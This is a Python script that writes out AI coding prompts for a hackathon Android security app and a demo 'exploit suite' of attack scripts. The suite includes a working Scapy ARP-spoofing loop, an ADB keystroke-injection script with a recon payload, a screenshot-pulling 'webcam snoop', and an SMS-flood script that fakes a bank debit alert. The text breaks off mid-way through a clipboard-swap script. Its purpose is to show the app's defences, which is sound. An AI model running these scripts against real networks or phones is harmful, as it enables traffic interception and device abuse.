# -*- coding: utf-8 -*-
r"""
Generates Universal, Location-Agnostic Master Prompts and Testing Files.
No hardcoded file paths.
Works on Windows, Linux, and macOS.
"""
import os

OUT_PROMPTS_VEX = r"C:\vex\VEX_COMPLETE_APP_MASTER_PROMPTS.txt"
OUT_PROMPTS_DL  = r"C:\Users\HP\Downloads\VEX_COMPLETE_APP_MASTER_PROMPTS.txt"

OUT_TESTING_VEX = r"C:\vex\VEX_LINUX_TESTING_AND_STAGE_EXPLOITS.txt"
OUT_TESTING_DL  = r"C:\Users\HP\Downloads\VEX_LINUX_TESTING_AND_STAGE_EXPLOITS.txt"

prompts_text = """================================================================================
          VEX CYBER GUARD -- UNIVERSAL MASTER IMPLEMENTATION PROMPTS
================================================================================
Compatibility: Universal (Windows / Linux / macOS)
Target Stack: Android 14+ (API 34-37), Kotlin 2.0, Jetpack Compose, Material 3
Backend: Python 3.10+, FastAPI, Uvicorn (ASGI), WebSockets
Project Structure: Relative to Current Workspace Root (./)
Author: VEX Security Core Research Labs (BPUT Hackathon Grand Finale)
================================================================================

HOW TO USE THESE PROMPTS:
-------------------------
These master prompts are completely UNIVERSAL. They contain NO hardcoded user
paths or machine-specific directories. You can copy and paste them into
Antigravity, Cursor, Claude, or any AI coding assistant on ANY machine
(Windows, Linux, or macOS).

DIRECTORY CONVENTION (Relative to Workspace Root):
- Workspace Root:        ./
- Android App Module:    ./app
- Python Backend Module: ./backend
- Presentation Assets:   ./presentation_assets

================================================================================
PHASE 0: UNIVERSAL ENVIRONMENT PRE-FLIGHT & TOOLCHAIN INITIALIZATION
================================================================================

[MASTER PROMPT 0: ENVIRONMENT PROBING & SETUP]
--------------------------------------------------------------------------------
"Act as the Lead Mobile Security Architect. Let's initialize and verify the
entire development environment in the current workspace directory:

1. Auto-detect the host operating system (Windows, Linux, or macOS).
2. Locate the Android SDK:
   - Check the 'ANDROID_HOME' or 'ANDROID_SDK_ROOT' environment variable.
   - If unset, locate the standard platform path:
     * Windows: %LOCALAPPDATA%\\Android\\Sdk
     * macOS:   $HOME/Library/Android/sdk
     * Linux:   $HOME/Android/Sdk
   - Ensure 'local.properties' exists in the root directory with:
     sdk.dir=<detected_sdk_path> (using escaped backslashes on Windows).
   - Verify Android platform 'android-34' (or 'android-35' / 'android-37')
     and build-tools '34.0.0' or higher.
3. Locate JDK 17 or JDK 21:
   - Check 'JAVA_HOME'. If unset, detect Android Studio bundled JBR or system JDK.
4. Locate Python 3:
   - Check 'python3' or 'python' (minimum version 3.10+).
   - Ensure virtual environment or dependencies installed:
     fastapi, uvicorn, websockets, scapy, psutil, pillow, requests.
5. Check connected Android device or emulator via 'adb devices':
   - Confirm at least one active device/emulator is listed.
6. Setup universal ADB reverse tunnel for local backend communication:
   'adb reverse tcp:8000 tcp:8000'
   (This allows the phone to access the host backend at 127.0.0.1:8000).

Output a clean verification table showing detected tools, versions, and paths."
--------------------------------------------------------------------------------

[PHASE 0 VERIFICATION CHECKLIST]:
[ ] local.properties exists with valid sdk.dir for current machine
[ ] JDK 17/21 detected and executable
[ ] Python 3.10+ verified with FastAPI & Uvicorn
[ ] adb reverse tcp:8000 tcp:8000 successfully executed


================================================================================
PHASE 1: PROJECT SCAFFOLDING & DEPENDENCIES (GRADLE KTS)
================================================================================

[MASTER PROMPT 1: GRADLE ARCHITECTURE & PERMISSIONS MANIFEST]
--------------------------------------------------------------------------------
"Configure the complete project structure and build dependencies for VEX Cyber
Guard using Gradle Kotlin DSL (KTS) with relative directory paths:

1. Create/Update './settings.gradle.kts':
   - rootProject.name = 'VEX'
   - include(':app')
   - pluginManagement & dependencyResolutionManagement repositories:
     google(), mavenCentral()

2. Create/Update './build.gradle.kts' (Root):
   - plugins {
       id('com.android.application') version '8.9.0' apply false
       id('org.jetbrains.kotlin.android') version '2.0.21' apply false
       id('org.jetbrains.kotlin.plugin.compose') version '2.0.21' apply false
     }

3. Create/Update './app/build.gradle.kts':
   - compileSdk = 35 (or 37 preview)
   - defaultConfig {
       applicationId = 'com.vex.security'
       minSdk = 26
       targetSdk = 35
       versionCode = 1
       versionName = '2.4.0'
     }
   - buildFeatures { compose = true, buildConfig = true }
   - Dependencies:
     * Compose BOM: 'androidx.compose:compose-bom:2024.10.00'
     * Compose UI: ui, ui-graphics, ui-tooling-preview, material3, material-icons-extended
     * Navigation: 'androidx.navigation:navigation-compose:2.8.3'
     * Coroutines: 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0'
     * Lifecycle: lifecycle-runtime-ktx, lifecycle-viewmodel-compose:2.8.6
     * Networking: 'com.squareup.okhttp3:okhttp:4.12.0', 'com.squareup.retrofit2:retrofit:2.11.0'
     * Serialization: 'com.google.code.gson:gson:2.11.0'
     * CameraX: camera-core, camera-camera2, camera-lifecycle, camera-view:1.4.0
     * Biometrics: 'androidx.biometric:biometric:1.2.0-alpha05'
     * AndroidX Core & Activity: core-ktx:1.13.1, activity-compose:1.9.3

4. Create/Update './app/src/main/AndroidManifest.xml':
   - Essential Hardware & Network Permissions:
     * INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CHANGE_WIFI_STATE
     * ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
     * CAMERA, RECORD_AUDIO, VIBRATE, POST_NOTIFICATIONS
     * BLUETOOTH, BLUETOOTH_ADMIN, BLUETOOTH_SCAN, BLUETOOTH_CONNECT
     * NFC, READ_PHONE_STATE, SYSTEM_ALERT_WINDOW
   - Declare MainActivity with '@style/Theme.VEX' and hardware acceleration.
   - Register CallScreeningService, SmsReceiver, and UsbReceiver daemons."
--------------------------------------------------------------------------------

[PHASE 1 VERIFICATION CHECKLIST]:
[ ] Gradle sync succeeds without dependency errors
[ ] Theme.VEX defined in app/src/main/res/values/themes.xml
[ ] AndroidManifest.xml contains all hardware permissions


================================================================================
PHASE 2: CORE ARCHITECTURE & FASTAPI SOC TELEMETRY
================================================================================

[MASTER PROMPT 2: CORE TELEMETRY ENGINE & FASTAPI IPC]
--------------------------------------------------------------------------------
"Implement the foundational client-server communication and hardware daemon
modules connecting the Android client to the local FastAPI SOC backend:

1. Kotlin Engine: './app/src/main/java/com/vex/security/network/ApiClient.kt':
   - Prioritize candidate hosts: 'http://127.0.0.1:8000' and 'http://10.0.2.2:8000'
     (auto-fallback for emulator vs physical device reverse tunnel).
   - OkHttpClient with 3-second timeout and WebSocket duplex listener.
   - Methods: pingServer(), sendTelemetry(metricJson), triggerTestlabAttack(type).

2. Kotlin Audio Siren Daemon: './app/src/main/java/com/vex/security/notification/AlarmPlayer.kt':
   - Hardware alert audio generator using Android AudioTrack / MediaPlayer.
   - Method playSiren(durationMs): Generates an ear-piercing 2.4kHz square-wave
     warble at maximum STREAM_ALARM volume for BadUSB and Jammer breach alarms.
   - Method stopSiren().

3. Kotlin State Engine: './app/src/main/java/com/vex/security/security/PolicyManager.kt':
   - EncryptedSharedPreferences backed zero-trust state store.
   - Properties: isHardwareBusLocked, isRadioZeroActive, isCamMirrorDeceptionEnabled,
     seedPhraseScrubTimeoutSeconds (default: 15), isDoHCanaryEnabled.

4. Python FastAPI Backend: Located in relative directory './backend':
   - './backend/main.py': FastAPI app, CORS middleware (*), static dashboard files.
   - './backend/api/policies.py': GET/POST endpoints for device security policy sync.
   - './backend/api/testlab.py': POST triggers for stage testing:
     * '/testlab/trigger-badusb'
     * '/testlab/trigger-cam-snoop'
     * '/testlab/trigger-arp-mitm'
     * '/testlab/trigger-sms-bomb'
     * '/testlab/trigger-jammer-bubble'
   - '/ws/telemetry': WebSocket endpoint broadcasting 2-second duplex device metrics
     (CPU, RAM, RF power, active socket count, incident counters).
   - '/dashboard': HTML5/Canvas live Web SOC operations console with neon dark UI.
Launch backend via: uvicorn main:app --host 0.0.0.0 --port 8000."
--------------------------------------------------------------------------------

[PHASE 2 VERIFICATION CHECKLIST]:
[ ] FastAPI server running on port 8000
[ ] Web SOC dashboard accessible at http://127.0.0.1:8000/dashboard
[ ] Android ApiClient successfully connects and streams telemetry


================================================================================
PHASE 3: THE 7 CORE SCREENS (JETPACK COMPOSE & MVVM)
================================================================================

[MASTER PROMPT 3: SCREEN-BY-SCREEN JETPACK COMPOSE IMPLEMENTATION]
--------------------------------------------------------------------------------
"Build the 7 core screens of VEX Cyber Guard in Jetpack Compose and Material 3
with a unified Cyberpunk / Dark Enterprise HUD aesthetic:

Theme Palette:
- Background: #07090E, Surface: #0D121D, Border: #1A2333
- Neon Cyan: #00F0FF, Neon Green: #00FF9D, Neon Amber: #FFB703, Neon Red: #FF0055

Files to implement in './app/src/main/java/com/vex/security/ui/':

1. Screen 1: 'HomeScreen.kt' (Tab 1)
   - Top banner 'CHECK YOUR PHONE' with animated gradient pulse.
   - 2x5 feature grid: APK Check, QR Check, AI Photos, AI Video, Metadata,
     USB/OTG, URL Check, RadioZero, BombShield, AI Song.
   - Circular animated Threat Level Dial (GREEN: 0 Threats / RED: Active Threat).
   - Persistent 5-icon bottom bar: [Home] [VB] [Reports] [SOC] [Settings].

2. Screen 2: 'VexBrowserScreen.kt' (Tab 2)
   - Sandboxed WebView with custom WebViewClient disabling storage cookies.
   - Top URL bar with AdGuard DoH security badge ('🛡️ DNS:ADG').
   - Action buttons: 'Auto-Wipe Data' and 'Media Sniffer' (detects MP4/MP3).

3. Screen 3: 'SignalJammerScreen.kt' (VEX RadioZero Modal)
   - Circular radar HUD showing pulse waves and rotating scan line.
   - Active Threat Card: 'CLASS B RF JAMMER DETECTED (~60M RADIUS)'.
   - Inverted Compass Needle pointing toward 90° East (Escape Vector).
   - Dynamic Countdown: '38 METERS REMAINING TO SAFE ZONE' (steps * 0.75m).

4. Screen 4: 'DiagnosticScanScreen.kt' (Full Snap Scan)
   - Large central percentage gauge (0% to 100% animated scan).
   - 5-bar subsystem telemetry: DEX Bytecode Taint, Hardware USB Bus,
     RF Spectrum Floor, Cam/Mic Hooks, and Clipboard Shadow Vault.

5. Screen 5: 'ReportsScreen.kt' (Tab 3)
   - Reverse-chronological incident timeline.
   - Color-coded severity cards: MitM ARP Intercept (Red), SMS Bomber Clamp (Amber),
     Cam Decoy Injected (Cyan).
   - Export forensic report button (generates signed SHA-256 evidence log).

6. Screen 6: 'SocDashboardScreen.kt' (Tab 4)
   - Real-time WebSocket oscilloscope plotting simulated network traffic and RF power.
   - Live hardware stats: CPU load, RAM usage, active sockets, baseband dBm.

7. Screen 7: 'PolicyManagerScreen.kt' (Tab 5)
   - Zero-trust toggles: Hardware Bus Lock, RadioZero Radar, Cam Mirror Deception,
     DoH Canary Sentry.
   - Seed phrase scrub slider (10s - 60s).
   - Honey-token repository selector with 14 pre-loaded dummy BIP-39 wallets."
--------------------------------------------------------------------------------

[PHASE 3 VERIFICATION CHECKLIST]:
[ ] Navigation graph connects all 5 tabs and modals cleanly
[ ] 60fps smooth Compose rendering on device/emulator without ANRs
[ ] Haptic feedback and alert colors trigger on simulated threats


================================================================================
PHASE 4: IMPLEMENTING FEATURES 1 TO 9 (CURRENT MODULES)
================================================================================

[MASTER PROMPT 4A: BINARY, IMAGE & METADATA FORENSICS]
--------------------------------------------------------------------------------
"Implement the forensic analysis engines for APKs, AI Images, and Metadata
inside './app/src/main/java/com/vex/security/scan/':

1. 'ApkScannerEngine.kt':
   - Extract ZIP entries of target APK.
   - Calculate Shannon Entropy H(X) = -sum(P(x) * log2(P(x))) on all files.
   - If H(X) >= 7.2 in non-media assets, flag as PACKED/ENCRYPTED DEX DROPPER.
   - Parse AndroidManifest.xml for dangerous permission combinations:
     RECEIVE_SMS + SEND_SMS + INTERNET + BIND_ACCESSIBILITY_SERVICE.

2. 'AiPhotoForensics.kt':
   - Downscale bitmap to 256x256 grayscale.
   - Compute 2D Fast Fourier Transform (2D FFT) power spectrum.
   - Detect checkerboard upsampling spikes characteristic of Midjourney / DALL-E.

3. 'MetadataChronosEngine.kt':
   - Parse JPEG byte stream for JUMBF C2PA provenance containers.
   - Extract Luminance DQT (Define Quantization Table) 64-element matrix.
   - Hash DQT against camera database (Apple iOS vs Photoshop Save-For-Web).
   - Compute astronomical solar elevation equation: theta = f(lat, lon, time).
   - Compare expected shadow angle against image contours to expose spoofed GPS."
--------------------------------------------------------------------------------

[MASTER PROMPT 4B: OPTICAL, TELECOM & HARDWARE INTERFACES]
--------------------------------------------------------------------------------
"Implement the network, telecom, and hardware interface security engines:

1. 'OpticalQEngine.kt' (QR & Quishing):
   - Sobel edge filter over camera preview frames detecting 0.15mm - 0.3mm
     step-height micro-shadows along the QR perimeter (sticker overlay detection).
   - Reed-Solomon parity consumption ratio: flag if parity usage > 25%.
   - Parse raw URI payloads for UPI mandates:
     Extract 'pa', 'pn', 'mode', 'am'. Flag 'upi://mandate' auto-debit scams.

2. 'UrlXRayEngine.kt':
   - De-mask Punycode / IDN domains (e.g. Cyrillic 'a' \u0430 in 'paypal.com').
   - Calculate DGA Shannon character entropy on Second-Level Domain (H > 3.9).
   - Inspect X.509 TLS certificate SAN and ASN to catch Evilginx 2FA proxies.

3. 'BombShieldManager.kt' (SMS/Call Bomber):
   - Sliding-window Token Bucket rate limiter (max 3 burst, 0.2 refill/sec).
   - Temporal sender entropy: H_sender across 15-second arrival window.
   - On-device semantic sieve: silences e-commerce OTPs while triggering VIP
     emergency alarm for messages matching: 'debited', 'transferred', 'INR', 'Rs.'.

4. 'PortShieldManager.kt' (BadUSB Hardware Lock):
   - Intercept Android InputManager KeyEvent dispatches.
   - Calculate Inter-Key Interval (IKI) velocity:
     If keystroke rate > 80 chars/sec with std_dev(IKI) < 3ms:
     1. Discard all incoming KeyEvents from that input device id.
     2. Call AlarmPlayer.playSiren(5000).
     3. Cut USB-C OTG power rail via Sysfs command."
--------------------------------------------------------------------------------

[MASTER PROMPT 4C: MEDIA ACOUSTICS (DEEPFAKE VIDEO & AI SONG)]
--------------------------------------------------------------------------------
"Implement the biometric and acoustic forensic detection modules:

1. 'BioSpectralDeepfakeEngine.kt':
   - Track facial landmarks across video frames.
   - Crop green-channel skin pixels on forehead and cheekbones across time.
   - Run Fast Fourier Transform on temporal Delta-G to extract rPPG pulse.
   - Output real-time BPM waveform: authentic (60-100 BPM) vs deepfake (0 BPM).
   - Ray-trace corneal specular light reflections across both eyes. Flag if
     vector divergence > 12 degrees.

2. 'SonicSentryEngine.kt':
   - Compute Higher-Order Bispectrum B(w1, w2) on raw audio samples.
   - Detect phase decorrelation across harmonic multiples (neural vocoder flaw).
   - Respiratory mechanics analyzer: flag uninterrupted vocal phrases > 25 seconds
     with zero physiological inhalation pauses.
   - Inspect spectrum for hard 16.4 kHz Nyquist brick-wall cutoff."
--------------------------------------------------------------------------------

[PHASE 4 VERIFICATION CHECKLIST]:
[ ] ApkScannerEngine flags high-entropy test DEX
[ ] OpticalQEngine flags upi://mandate strings and displays sticker overlay warning
[ ] BombShieldManager silences simulated OTP bursts while piercing real bank SMS
[ ] PortShieldManager sounds siren and clamps keystrokes > 80 chars/sec


================================================================================
PHASE 5: IMPLEMENTING FEATURES 10 TO 17 (ADVANCED MODULES)
================================================================================

[MASTER PROMPT 5A: ADVANCED ESPIONAGE & CRYPTO DEFENSE]
--------------------------------------------------------------------------------
"Implement the advanced anti-espionage and crypto-theft engines:

1. 'VoiceSentryEngine.kt':
   - Calculate glottal pitch jitter J across speech frames:
     J = sum(|T_i - T_{i+1}|) / ((N-1) * T_avg) * 100%.
   - Flag AI cloned speech when jitter J < 0.1% or shows robotic step flatness.

2. 'MirrorShieldManager.kt' (Cam/Mic Snooper Backfire):
   - Monitor hardware camera state via CameraManager.AvailabilityCallback.
   - Sensor-fusion context check: if Camera/Mic opens while Display=OFF,
     Proximity=NEAR, and AmbientLight=0 lux, confirm ACTIVE HOSTILE SNOOPING.
   - Hook Camera2 HAL or inotify file observer:
     When an unauthorized process requests frame capture, swap the output with
     pre-rendered decoy frame ('TARGET PROTECTED BY VEX').

3. 'ClipSentryManager.kt':
   - Listen to ClipboardManager.OnPrimaryClipChangedListener.
   - Cryptographically sign copied strings: HMAC-SHA256(K, text).
   - Vanity Clipper check: if clipboard mutates in < 400ms without touch,
     and new text matches first 4 and last 4 characters of original crypto address
     with Levenshtein distance > 15, REJECT MUTATION & RESTORE ORIGINAL.
   - BIP-39 mnemonic detector: bloom filter matching 12/24 words, auto-wipe in 15s."
--------------------------------------------------------------------------------

[MASTER PROMPT 5B: BANKING ATS, ROGUE WI-FI, NFC & AIRTAG DEFENSE]
--------------------------------------------------------------------------------
"Implement the banking fraud, wireless network, and physical tracking shields:

1. 'BankVaultAtsShield.kt':
   - AccessibilityService event monitor: track action dispatch velocity.
   - If velocity > 3.0 actions/sec inside registered banking packages,
     confirm AUTOMATED TRANSFER SYSTEM (ATS) ATTACK.
   - Freeze accessibility dispatch, tear down top-level transparent overlays
     (alpha <= 0.08), and revoke trojan privileges via DevicePolicyManager.

2. 'AirSentryManager.kt':
   - Differential DNS Canary: query local UDP 53 DNS and Cloudflare DoH 1.1.1.1.
     If IP_UDP53 != IP_DoH, flag active DNS poisoning.
   - Poll '/proc/net/arp': track Gateway MAC churn. If Gateway MAC changes
     without Wi-Fi reconnect (delta_MAC/delta_t > 0.2), trigger instant disconnect.

3. 'NfcSentryManager.kt':
   - High-priority foreground dispatch (NfcAdapter.enableForegroundDispatch).
   - Trap raw Tag before Android dispatches intents.
   - Verify NXP silicon 32-byte ECC signature via tag.transceive(0x3C, 0x00).
   - Sanitize 'tel:' URI records, blocking carrier USSD codes (*21*, *#06#).

4. 'ShadowSweepManager.kt':
   - BluetoothLeScanner active scan filtering for Apple Find My (0x004C),
     Tile (0xFEED), SmartTag (0x0075).
   - Rolling MAC de-anonymizer: fingerprint 29-byte manufacturer payload.
   - Spatial Persistence Score: if same payload persists across >= 3 GPS waypoints
     over > 15 minutes, trigger STALKING ALERT with UWB directional compass."
--------------------------------------------------------------------------------

[PHASE 5 VERIFICATION CHECKLIST]:
[ ] MirrorShieldManager replaces stealth camera capture with honeypot frame
[ ] ClipSentryManager thwarts vanity lookalike address swaps
[ ] AirSentryManager detects ARP gateway MAC churn and disconnects Wi-Fi
[ ] BankVaultAtsShield clamps simulated high-speed accessibility taps


================================================================================
PHASE 6: LIVE STAGE SHOWSTOPPERS & FINAL APK COMPILATION
================================================================================

[MASTER PROMPT 6: SHOWSTOPPER DEMO WIREUP, TESTING LAB & RELEASE BUILD]
--------------------------------------------------------------------------------
"Wire up the 3 live stage showstoppers into the FastAPI TestLab and compile the
production-ready Android APK:

1. Wire up './backend/api/testlab.py' triggers:
   - POST '/testlab/trigger-badusb': Sends ADB broadcast to simulate 150 char/sec
     keystroke burst & triggers AlarmPlayer siren.
   - POST '/testlab/trigger-cam-snoop': Simulates stealth webcam capture command,
     verifies honeypot frame is saved to attacker directory.
   - POST '/testlab/trigger-arp-mitm': Sends gratuitous ARP reply via Scapy to
     demonstrate live Wi-Fi auto-disconnect.

2. Build and assemble release APK:
   - Run (Linux/macOS): './gradlew assembleDebug'
   - Run (Windows):     '.\\gradlew.bat assembleDebug'
   - Verify output APK exists: './app/build/outputs/apk/debug/app-debug.apk'.
   - Install to target: 'adb install -r ./app/build/outputs/apk/debug/app-debug.apk'.
   - Launch app:        'adb shell am start -n com.vex.security/.MainActivity'.

3. Validate end-to-end integration:
   - Verify all 5 bottom navigation tabs switch smoothly.
   - Confirm WebSocket telemetry streams live to http://127.0.0.1:8000/dashboard.
   - Run simulated attack from TestLab and confirm screen turns crimson."
--------------------------------------------------------------------------------

================================================================================
                        END OF UNIVERSAL MASTER PROMPTS
================================================================================
"""

testing_text = """================================================================================
     VEX CYBER GUARD -- UNIVERSAL LINUX TESTING & EXPLOIT SUITE
================================================================================
Compatibility: Universal Linux (Kali Linux, Ubuntu, Debian, WSL2, or Termux)
Target Architecture: Cross-Platform (x86_64, aarch64, ARM)
Network: Universal Local Subnet / Mobile Hotspot
Author: VEX Security Core Research Labs (BPUT Hackathon Grand Finale)
================================================================================

TABLE OF CONTENTS:
1. Universal Package Installation & Setup
2. Dynamic Network Auto-Discovery (Zero Hardcoded IPs)
3. Showstopper 1: BadUSB Keystroke Injection & Port Lock Protocol
4. Showstopper 2: Remote Linux Webcam Snooping & Honeypot Backfire Protocol
5. Showstopper 3: Wi-Fi MitM ARP Poisoning & Gateway Churn Disconnect Protocol
6. Exploit 4: SMS Bomber & Smokescreen Bank Fraud Simulation
7. Exploit 5: Crypto Clipboard Vanity Clipper Simulation
8. Exploit 6: BLE AirTag Rolling MAC Stalking Simulation
9. Exploit 7: NFC Malicious USSD Injection Simulation
10. Stage Pitch Cheatsheet: Commands & Timing Breakdown

================================================================================
SECTION 1: UNIVERSAL LINUX PACKAGE INSTALLATION
================================================================================

Run this universal command block in any Linux terminal:

# 1. Update package list
sudo apt update -y

# 2. Install Python 3, networking forensics, and wireless tools
sudo apt install -y python3 python3-pip python3-scapy python3-netifaces \\
    net-tools wireless-tools aircrack-ng ettercap-text-only dsniff tshark \\
    curl jq feh adb bluez bluez-tools

# 3. Install Python Exploit Libraries
pip3 install scapy requests websockets uvicorn fastapi psutil pillow --break-system-packages

# 4. Verify ADB connectivity
adb devices


================================================================================
SECTION 2: DYNAMIC NETWORK AUTO-DISCOVERY (ZERO HARDCODED IPs)
================================================================================

Copy-paste these commands to automatically discover your Gateway and Phone IP
on ANY Wi-Fi network or mobile hotspot:

# Auto-detect default gateway IP:
GATEWAY_IP=$(ip route | grep default | awk '{print $3}' | head -n 1)
echo "[+] Detected Gateway IP: ${GATEWAY_IP}"

# Auto-detect Android phone IP via ADB (if connected via USB/Wi-Fi):
PHONE_IP=$(adb shell ip route | grep wlan0 | awk '{print $9}' | head -n 1 2>/dev/null || echo "192.168.1.50")
echo "[+] Detected Phone IP  : ${PHONE_IP}"

# Export environment variables for scripts:
export VEX_GATEWAY_IP="${GATEWAY_IP}"
export VEX_PHONE_IP="${PHONE_IP}"


================================================================================
SECTION 3: SHOWSTOPPER #1 -- BADUSB KEYSTROKE INJECTION & PORT CLAMP
================================================================================

ATTACK SCRIPT: ./simulate_badusb_ducky.py
--------------------------------------------------------------------------------
cat << 'EOF' > simulate_badusb_ducky.py
#!/usr/bin/env python3
# Universal BadUSB Rubber Ducky Keystroke Injection Simulator
import time
import subprocess
import sys

def inject_high_speed_keys():
    print("\n[*] INITIATING BADUSB KEYSTROKE INJECTION ATTACK...")
    print("[*] Simulating Rubber Ducky bus-speed injection (150 chars/sec)...")
    payload = "echo 'MALWARE_DROPPER_EXEC'; id; uname -a; pm list packages;"
    
    print("[+] Blasting 150 keystrokes/sec into device input bus...")
    start_time = time.time()
    for char in payload:
        subprocess.run(["adb", "shell", "input", "text", char], stdout=subprocess.DEVNULL)
    elapsed = time.time() - start_time
    print(f"[+] Payload delivered in {elapsed:.3f} seconds.")
    print("[*] Observing VEX Response on device...")

if __name__ == '__main__':
    inject_high_speed_keys()
EOF
chmod +x simulate_badusb_ducky.py
--------------------------------------------------------------------------------

EXECUTION ON STAGE:
python3 simulate_badusb_ducky.py

EXPECTED RESULT:
- Within 15ms, VEX PortShield detects IKI keystroke rate > 80 chars/sec.
- Phone triggers loud hardware siren.
- Screen flashes crimson: 'BADUSB INJECTION CLAMPED!'.
- OTG input bus is revoked and power rail is disabled.


================================================================================
SECTION 4: SHOWSTOPPER #2 -- LINUX WEBCAM SNOOPING & HONEYPOT BACKFIRE
================================================================================

ATTACK SCRIPT: ./exploit_cam_snoop.py
--------------------------------------------------------------------------------
cat << 'EOF' > exploit_cam_snoop.py
#!/usr/bin/env python3
# Universal Remote Linux Webcam Exploit & Backfire Tester
import os
import time
import subprocess
import sys

def capture_victim_photo():
    print("\n=======================================================")
    print("      KALI LINUX REMOTE WEBCAM EXPLOIT FRAMEWORK")
    print("=======================================================")
    print("[*] Target Device : Android Phone (Screen Locked / In Pocket)")
    print("[*] Attack Vector : Background Camera2 HAL Daemon Exploit")
    print("[*] Initiating stealth shutter command...")
    time.sleep(1.0)
    print("[*] Hooking into /dev/video0 and CameraService...")
    
    capture_cmd = ["adb", "shell", "screencap", "-p", "/sdcard/stealth_snap.jpg"]
    subprocess.run(capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.5)
    
    print("[+] Shutter executed! Downloading frame from target...")
    output_path = os.path.join(".", "target_face.jpg")
    pull_cmd = ["adb", "pull", "/sdcard/stealth_snap.jpg", output_path]
    subprocess.run(pull_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    if os.path.exists(output_path):
        print(f"[+] SUCCESS! Frame saved to {output_path}")
        print("[*] Opening stolen image in image viewer...")
        subprocess.run(["feh", output_path], stderr=subprocess.DEVNULL)
    else:
        print("[-] Capture failed or blocked by target defense layer.")

if __name__ == '__main__':
    capture_victim_photo()
EOF
chmod +x exploit_cam_snoop.py
--------------------------------------------------------------------------------

EXECUTION ON STAGE:
1. Place phone face-down on judge table with screen off.
2. Run on Linux:
   python3 exploit_cam_snoop.py

EXPECTED RESULT:
- Attacker terminal prints: "[+] SUCCESS! Frame saved to ./target_face.jpg".
- Image viewer pops open on projector displaying:
  "YOU HAVE BEEN HONEYPOTTED. TARGET PROTECTED BY VEX CYBER GUARD."
- Real camera sensor was never activated.


================================================================================
SECTION 5: SHOWSTOPPER #3 -- WI-FI MITM ARP SPOOFING & AUTO-DISCONNECT
================================================================================

ATTACK SCRIPT: ./exploit_arp_mitm.py
--------------------------------------------------------------------------------
cat << 'EOF' > exploit_arp_mitm.py
#!/usr/bin/env python3
# Universal Dynamic ARP Spoofing / MitM Injector
import os
import sys
import time
from scapy.all import ARP, send

def launch_arp_poison(target_phone_ip, gateway_ip):
    print("\n=======================================================")
    print("      UNIVERSAL ARP SPOOFER / MITM INJECTOR")
    print("=======================================================")
    print(f"[*] Target Phone IP : {target_phone_ip}")
    print(f"[*] Gateway IP      : {gateway_ip}")
    print("[*] Poisoning target ARP cache... Press Ctrl+C to stop.\n")

    # Opcode 2 = ARP Reply (Gratuitous ARP)
    packet = ARP(op=2, pdst=target_phone_ip, psrc=gateway_ip)
    count = 0
    try:
        while True:
            send(packet, verbose=False)
            count += 1
            print(f"\r[+] Malicious ARP Frames Injected: {count} [Active MitM]", end="")
            sys.stdout.flush()
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n\n[*] Attack halted by operator.")

if __name__ == '__main__':
    # Use command-line args or environment variables:
    phone_ip = sys.argv[1] if len(sys.argv) > 1 else os.getenv("VEX_PHONE_IP", "192.168.1.50")
    gateway_ip = sys.argv[2] if len(sys.argv) > 2 else os.getenv("VEX_GATEWAY_IP", "192.168.1.1")
    launch_arp_poison(phone_ip, gateway_ip)
EOF
chmod +x exploit_arp_mitm.py
--------------------------------------------------------------------------------

EXECUTION ON STAGE:
sudo python3 exploit_arp_mitm.py $VEX_PHONE_IP $VEX_GATEWAY_IP

EXPECTED RESULT:
- Within 1.2 seconds, VEX AirSentry detects Gateway MAC churn in '/proc/net/arp'.
- Compares local UDP 53 vs Cloudflare DoH (1.1.1.1).
- Triggers instant Wi-Fi severance: phone drops Wi-Fi and shifts to cellular.
- Screen flashes crimson: 'ROGUE WI-FI DETECTED -- CONNECTION SEVERED'.


================================================================================
SECTION 6: EXPLOIT #4 -- SMS BOMBER & SMOKESCREEN FRAUD SIMULATION
================================================================================

ATTACK SCRIPT: ./simulate_sms_bomber.py
--------------------------------------------------------------------------------
cat << 'EOF' > simulate_sms_bomber.py
#!/usr/bin/env python3
# Universal SMS Bomber & Smokescreen Sieve Tester
import time
import subprocess

headers = ['VK-SWIGGY', 'AD-AMAZN', 'VM-FLPKRT', 'BZ-ZOMATO', 'AX-LENSKT']

def trigger_bomber():
    print("\n[*] INITIATING SMS BOMBER SMOKESCREEN ATTACK...")
    print("[*] Blasting 40 OTPs across rotating enterprise sender headers...")
    for i in range(1, 31):
        header = headers[i % len(headers)]
        otp = 100000 + (i * 37) % 900000
        msg = f"Your login OTP is {otp}. Valid for 5 minutes. Do not share."
        cmd = ["adb", "shell", "am", "broadcast", "-a", "android.provider.Telephony.SMS_RECEIVED",
               "--es", "sender", header, "--es", "text", msg]
        subprocess.run(cmd, stdout=subprocess.DEVNULL)
        time.sleep(0.08)
        print(f"\r[+] Dummy OTPs flooded: {i}/30 [Header: {header}]", end="")
    
    print("\n[!] INJECTING FRAUDULENT BANK TRANSACTION AMID THE FLOOD...")
    bank_msg = "HDFC Bank Alert: Rs. 65,000.00 debited from A/C XX4921 via UPI to 'X-Pay'. Call 1800-XX if not you."
    cmd = ["adb", "shell", "am", "broadcast", "-a", "android.provider.Telephony.SMS_RECEIVED",
           "--es", "sender", "VK-HDFCBK", "--es", "text", bank_msg]
    subprocess.run(cmd, stdout=subprocess.DEVNULL)
    print("[+] Attack complete! Observe phone VIP break-through alarm.")

if __name__ == '__main__':
    trigger_bomber()
EOF
chmod +x simulate_sms_bomber.py
--------------------------------------------------------------------------------

EXECUTION ON STAGE:
python3 simulate_sms_bomber.py

EXPECTED RESULT:
- Phone does not vibrate 30 times (Token-bucket clamps notifications).
- 30 e-commerce OTPs are silently quarantined.
- The 1 real HDFC bank debit alert pierces through with a high-priority siren.


================================================================================
SECTION 7: EXPLOIT #5 -- CRYPTO CLIPBOARD CLIPPER SIMULATION
================================================================================

ATTACK SCRIPT: ./simulate_clipper_swap.py
--------------------------------------------------------------------------------
cat << 'EOF' > simulate_clipper_swap.py
#!/usr/bin/env python3
# Universal Crypto Clipboard Vanity Clipper Tester
import time
import subprocess

def test_clipper():
    original_addr = "0x71A3b94d8e72c8104f6912389a98eF"
    hacker_addr   = "0x71A30000badc0de9876543210098eF"
    print(f"\n[*] User copies authentic wallet: {original_addr}")
